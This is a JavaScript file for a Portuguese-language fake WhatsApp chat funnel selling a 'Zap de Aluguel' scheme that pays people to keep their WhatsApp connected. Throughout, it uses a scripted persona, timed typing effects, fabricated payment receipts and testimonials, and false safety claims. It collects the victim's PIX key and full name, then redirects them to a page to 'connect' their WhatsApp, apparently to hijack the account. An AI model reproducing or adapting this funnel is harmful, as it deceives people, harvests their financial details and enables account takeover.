/* script.js - Funil Completo com Redirecionamento */

const config = {
    botName: "Ana Lamour",
    // Link do som de notificação
    audioUrl: "https://s3.typebot.io/public/workspaces/clxgpan6q000rljk8iyy6q66x/typebots/clxgpawpm000p10ew33m2mf3l/blocks/o6lzakgjf9az8tg6tyfk29lf?v=1718491238886",
    // Foto do Avatar usada no Player de Áudio
    avatarUrl: "https://i.postimg.cc/6736DyZy/Zap-Lucrativo-Photo.png"
};

// --- ROTEIRO COMPLETO ---
const chatFlow = [
    // 1. Boas vindas
    { type: 'text', content: '👋Seja bem-vindo(a) ao Programa Zap de Aluguel.', delay: 500 },
    
    // 2. Explicação
    { type: 'text', content: 'Aqui você descobre como transformar seu WhatsApp em uma fonte de renda automática, de forma 100% segura e validada.', delay: 1500 },
    
    // 3. Chamada vídeo
    { type: 'text', content: 'Assista ao vídeo abaixo da nossa especialista e entenda em poucos minutos como o programa funciona.', delay: 2000 },
    
    // 4. VÍDEO VERTICAL
    { 
        type: 'local_video', 
        url: 'https://bafybeifc45ztuu4u4akcc3o5n76nvhl2zvanhjdm3anoa6fixplnxsf76m.ipfs.spfs-gateway.thestratos.net', 
        delay: 1500 
    },

    // 5. Botão "Assisti"
    {
        type: 'input_button',
        options: [{ text: 'Assisti o vídeo', nextStep: null }],
        delay: 8000 
    },

    // 6. Alerta
    { type: 'text', content: '⚠️Atenção!\n\nNosso sistema realiza diferentes tipos de testes, e os resultados mais precisos acontecem quando as conexões são feitas através de contas WhatsApp Business.', delay: 1000 },
    
    // 7. Vantagem Business
    { type: 'text', content: '✅Se você tiver o WhatsApp Business instalado, essa será uma vantagem no seu pagamento.', delay: 3000 },
    
    // 8. Info preliminar
    { type: 'text', content: '1️⃣Antes de liberar sua vaga, precisamos confirmar algumas informações:', delay: 2500 },
    
    // 9. Pergunta App Instalado
    { type: 'text', content: 'Você possui o aplicativo WhatsApp instalado em seu dispositivo?', delay: 2000 },
    
    // 10. Botões Sim/Não
    {
        type: 'input_button',
        options: [
            { text: 'Sim, eu possuo.' },
            { text: 'Não, eu vou instalar agora.' }
        ],
        delay: 1000
    },

    // 11. Pergunta Internet
    { type: 'text', content: '2️⃣Você possui conexão direta e estável com a internet?', delay: 1000 },
    
    // 12. Botões Internet
    {
        type: 'input_button',
        options: [
            { text: 'Sim, eu possuo.' },
            { text: 'Não, eu vou utilizar dados moveis' }
        ],
        delay: 500
    },

    // 13. Pergunta Tipo de Whats
    { type: 'text', content: '3️⃣Sua conexão será realizada com um número de WhatsApp Comum ou WhatsApp Business?', delay: 1000 },
    
    // 14. Botões Tipo Whats
    {
        type: 'input_button',
        options: [
            { text: 'Whatsapp Padrão' },
            { text: 'Business' }
        ],
        delay: 500
    },

    // 15. Prova Social
    { type: 'text', content: '🎯Veja quem já está participando do Programa Zap de Aluguel', delay: 1000 },
    
    // 16. Explicação
    { type: 'text', content: 'Todos os dias, novos participantes estão recebendo seus pagamentos por manter o WhatsApp conectado.', delay: 2000 },

    // 17. IMAGEM DO COMPROVANTE
    { 
        type: 'image', 
        url: 'https://s3.typebot.io/public/workspaces/cmevbt77s0002jz04vhy8g2xd/typebots/cmevbtf810001ju041rbhmi7a/blocks/goqjdhcz43200jmf5r72m920?v=1759167038442', 
        delay: 3000 
    },

    // 18. ÁUDIO DEPOIMENTO
    { 
        type: 'audio_msg', 
        url: 'https://s3.typebot.io/public/workspaces/cmevbt77s0002jz04vhy8g2xd/typebots/cmevbtf810001ju041rbhmi7a/blocks/g7daf8w3pl4i1um8e0wlvbub?v=1759167008265',
        delay: 2000 
    },

    // 19. Quero Receber
    {
        type: 'input_button',
        options: [{ text: 'Quero receber também' }],
        delay: 8000 
    },

    // 20. Procedimento Pagamento
    { type: 'text', content: '💼Procedimento de pagamento do Programa Zap de Aluguel:', delay: 1000 },
    { type: 'text', content: 'Ao participar, o sistema realiza um agendamento de pagamento via PIX utilizando os dados informados abaixo.', delay: 2000 },
    { type: 'text', content: 'Isso acontece antes da conexão, como uma camada extra de segurança.', delay: 2500 },
    { type: 'text', content: 'Assim que o número for conectado e validado, o valor agendado é liberado automaticamente para a sua conta.', delay: 2000 },
    { type: 'text', content: '🔒 Esse processo garante que todos os participantes recebam com segurança, sem risco de execução sem pagamento.', delay: 2500 },
    { type: 'text', content: '🔑Para finalizar, informe sua chave PIX para o agendamento do pagamento.', delay: 2000 },
    
    // 26. Input Chave PIX
    { type: 'input_text', placeholder: 'Digite sua chave PIX...', varName: 'pix_key', delay: 1000 },

    // 27. Pedir Nome
    { type: 'text', content: '✨<b>Seu nome completo:</b>', delay: 500 },
    { type: 'text', content: 'Deve ser o mesmo cadastrado na sua conta bancária.', delay: 1000 },
    { type: 'text', content: '⚠️ Isso garante que o pagamento caia corretamente no titular da conta e que o comprovante seja emitido em seu nome.', delay: 3000 },
    
    // 30. Input Nome
    { type: 'input_text', placeholder: 'Digite seu nome completo...', varName: 'user_name', delay: 1000 },

    // 31. Confirmação Final
    { type: 'text', content: '✨ Assim que confirmar os dados, o sistema vai gerar automaticamente o comprovante de pagamento agendado, e a sua vaga será reservada oficialmente no Programa Zap de Aluguel.', delay: 3000 },
    { type: 'text', content: '🧾Show! Tudo certo, estamos gerando seu comprovante de pagamento agendado...', delay: 3000 },
    { type: 'text', content: 'Lembre-se que você pode cancelar e remover sua conexão a qualquer momento, sem taxas ou multas.', delay: 2000 },
    { type: 'text', content: 'Seu pagamento será liberado em até 24 horas após a validação da conexão.', delay: 1000 },
    
    // 32. BOTÃO FINAL (REDIRECIONAMENTO)
    {
        type: 'input_button',
        options: [{ 
            text: 'Conectar O whatsapp', 
            action: () => {
                // REDIRECIONA PARA A PÁGINA CONECTAR.HTML
                window.location.href = 'conectar.html'; 
            }
        }],
        delay: 2000
    }
];

// --- MOTOR DO CHAT ---
let currentStep = 0;
const messagesArea = document.getElementById('messages-area');
const typingIndicator = document.getElementById('typing-indicator');
const inputArea = document.getElementById('input-area');
const statusText = document.getElementById('status-text');
const audioNot = new Audio(config.audioUrl);
let userVariables = {};

function startChat() { processStep(); }

async function processStep() {
    if (currentStep >= chatFlow.length) return;
    const step = chatFlow[currentStep];

    await wait(500); 
    showTyping(true);
    await wait(step.delay || 1000); 
    showTyping(false);

    if (step.type === 'text') {
        addMessage('received', step.content);
        currentStep++;
        processStep();
    } 
    else if (step.type === 'local_video') {
        addLocalVideoMessage(step.url);
        currentStep++;
        processStep();
    }
    else if (step.type === 'image') {
        addImageMessage(step.url);
        currentStep++;
        processStep();
    }
    else if (step.type === 'audio_msg') {
        addCustomAudioMessage(step.url);
        currentStep++;
        processStep();
    }
    else if (step.type === 'input_button') { showButtons(step.options); }
    else if (step.type === 'input_text') { showTextInput(step); }
}

function addMessage(type, text) {
    const div = document.createElement('div');
    div.className = `message ${type}`;
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const tickHtml = type === 'sent' ? `<span class="tick"><svg viewBox="0 0 18 18"><path fill="#4fb6ec" d="M17.394 5.035l-9.03 9.031a.997.997 0 0 1-1.414 0l-5.657-5.657a.999.999 0 1 1 1.414-1.414l4.95 4.95 8.323-8.324a.999.999 0 1 1 1.414 1.414z"/></svg></span>` : '';
    let formattedText = text.replace(/\n/g, '<br>');
    div.innerHTML = `<div class="bubble">${formattedText}<div class="msg-meta"><span class="time">${time}</span>${tickHtml}</div></div>`;
    messagesArea.appendChild(div);
    scrollToBottom();
    if (type === 'received') playSound();
}

function addLocalVideoMessage(url) {
    const div = document.createElement('div');
    div.className = `message received`;
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    div.innerHTML = `
        <div class="bubble" style="padding: 5px;">
            <div class="video-container">
                <video src="${url}" controls autoplay playsinline></video>
            </div>
            <div class="msg-meta"><span class="time">${time}</span></div>
        </div>`;
    messagesArea.appendChild(div);
    scrollToBottom();
    playSound();
}

function addCustomAudioMessage(url) {
    const div = document.createElement('div');
    div.className = `message received`;
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    div.innerHTML = `
        <div class="bubble" style="padding: 5px 10px;">
            <div class="wa-audio-player">
                <div class="wa-audio-avatar">
                    <img src="${config.avatarUrl}">
                    <div class="wa-mic-icon"><i class="zmdi zmdi-mic"></i></div>
                </div>
                <div class="wa-player-controls">
                    <div class="wa-top-row">
                        <i class="zmdi zmdi-play-circle wa-play-btn"></i>
                        <input type="range" class="wa-slider" value="0" max="100">
                    </div>
                    <div class="wa-duration">0:00</div>
                </div>
            </div>
            <div class="msg-meta"><span class="time">${time}</span></div>
            <audio src="${url}" class="wa-hidden-audio"></audio>
        </div>`;
    messagesArea.appendChild(div);
    scrollToBottom();
    playSound();

    const audio = div.querySelector('.wa-hidden-audio');
    const playBtn = div.querySelector('.wa-play-btn');
    const slider = div.querySelector('.wa-slider');
    const durationText = div.querySelector('.wa-duration');

    audio.addEventListener('loadedmetadata', () => { durationText.innerText = formatTime(audio.duration); });
    audio.play().then(() => { playBtn.className = 'zmdi zmdi-pause-circle wa-play-btn'; }).catch(e => {});

    playBtn.addEventListener('click', () => {
        if (audio.paused) {
            document.querySelectorAll('audio').forEach(a => { if(a !== audio) a.pause(); });
            document.querySelectorAll('.wa-play-btn').forEach(b => { if(b !== playBtn) b.className = 'zmdi zmdi-play-circle wa-play-btn'; });
            audio.play();
            playBtn.className = 'zmdi zmdi-pause-circle wa-play-btn';
        } else {
            audio.pause();
            playBtn.className = 'zmdi zmdi-play-circle wa-play-btn';
        }
    });
    audio.addEventListener('timeupdate', () => {
        const percent = (audio.currentTime / audio.duration) * 100;
        slider.value = percent;
        slider.style.background = `linear-gradient(to right, #00a884 ${percent}%, #d1d7db ${percent}%)`;
        durationText.innerText = formatTime(audio.currentTime);
    });
    audio.addEventListener('ended', () => {
        playBtn.className = 'zmdi zmdi-play-circle wa-play-btn';
        slider.value = 0;
        slider.style.background = '#d1d7db';
        durationText.innerText = formatTime(audio.duration);
    });
    slider.addEventListener('input', () => {
        const time = (slider.value / 100) * audio.duration;
        audio.currentTime = time;
    });
}

function formatTime(seconds) {
    if(isNaN(seconds)) return "0:00";
    const m = Math.floor(seconds / 60);
    const s = Math.floor(seconds % 60);
    return `${m}:${s < 10 ? '0' : ''}${s}`;
}

function addImageMessage(url) {
    const div = document.createElement('div');
    div.className = `message received`;
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    div.innerHTML = `<div class="bubble" style="padding: 5px;"><img src="${url}" style="width:100%; border-radius:8px; display:block;"><div class="msg-meta"><span class="time">${time}</span></div></div>`;
    messagesArea.appendChild(div);
    scrollToBottom();
    playSound();
}

function showButtons(options) {
    inputArea.innerHTML = '';
    const container = document.createElement('div');
    container.className = 'btn-options';
    options.forEach(opt => {
        const btn = document.createElement('button');
        btn.className = 'chat-btn';
        btn.innerText = opt.text;
        btn.onclick = () => {
            if(opt.action) {
                opt.action();
            } else {
                inputArea.innerHTML = '';
                addMessage('sent', opt.text);
                currentStep++;
                processStep();
            }
        };
        container.appendChild(btn);
    });
    inputArea.appendChild(container);
}

function showTextInput(step) {
    inputArea.innerHTML = '';
    const container = document.createElement('div');
    container.className = 'text-input-container';
    const input = document.createElement('input');
    input.placeholder = step.placeholder || 'Digite aqui...';
    input.type = 'text';
    const btn = document.createElement('button');
    btn.className = 'send-btn-icon';
    btn.innerHTML = '<i class="zmdi zmdi-mail-send"></i>';
    const submit = () => {
        if(!input.value.trim()) return;
        const val = input.value;
        userVariables[step.varName] = val;
        inputArea.innerHTML = '';
        addMessage('sent', val);
        currentStep++;
        processStep();
    };
    btn.onclick = submit;
    input.addEventListener('keypress', (e) => { if(e.key === 'Enter') submit(); });
    container.appendChild(input);
    container.appendChild(btn);
    inputArea.appendChild(container);
    input.focus();
}

function showTyping(show) { if (show) { typingIndicator.classList.remove('hide'); statusText.innerText = 'digitando...'; scrollToBottom(); } else { typingIndicator.classList.add('hide'); statusText.innerText = 'Online'; } }
function scrollToBottom() { const c = document.getElementById('chat-container'); c.scrollTop = c.scrollHeight; }
function playSound() { audioNot.play().catch(e => {}); }
function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

window.onload = startChat;